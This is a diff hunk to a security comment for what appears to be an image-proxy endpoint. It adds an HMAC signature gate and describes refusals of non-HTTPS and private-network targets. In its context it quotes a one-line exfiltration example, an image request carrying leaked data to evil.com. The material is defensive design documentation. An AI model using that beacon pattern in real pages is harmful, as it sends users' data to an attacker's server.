@@ -7,7 +7,11 @@
  * `new Image().src = 'https://evil.com/?leak=...'`" channel.
  *
  * Safety:
- *   - Authenticated (gated by the standard /api/* session check).
+ *   - HMAC signature gate: every `?u=` must carry a matching `?s=`
+ *     server-side-issued via signProxyUrl (src/lib/img-proxy-sign.ts).
+ *     XSS in the dashboard origin cannot fabricate a proxy URL for an
+ *     attacker host without first stealing the per-process signing
+ *     secret or calling /api/img-proxy/sign with a live session.
  *   - Validates the upstream URL is https:// (no http: leaks of the
  *     dashboard's outbound IP via plaintext fetches).
  *   - Refuses private / loopback / link-local / CGNAT targets (reuses
